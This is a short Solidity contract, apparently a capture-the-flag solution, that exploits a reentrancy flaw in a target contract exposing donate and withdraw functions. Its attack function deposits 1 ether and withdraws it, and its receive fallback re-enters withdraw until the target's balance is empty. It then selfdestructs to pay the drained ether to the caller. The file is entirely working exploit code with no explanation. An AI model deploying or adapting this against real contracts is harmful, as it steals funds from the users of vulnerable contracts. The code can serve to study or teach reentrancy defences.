// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface Ire {

    function donate(address) external payable;
    function withdraw(uint256 ) external;
}
contract REHack {
Ire private immutable target;
constructor(address _target){
    target=Ire(_target);
}
function attack() external payable {
target.donate{value:1e18}(address(this));
target.withdraw(1e18);
require(address(target).balance == 0,"");
selfdestruct(payable (msg.sender));
}

receive() external payable { 
    uint amount = min(1e18,address(target).balance);
    if(amount > 0){
        target.withdraw(amount);
    }

}

function min(uint x, uint y) internal pure returns (uint) {
    return x <= y ? x : y;
}
}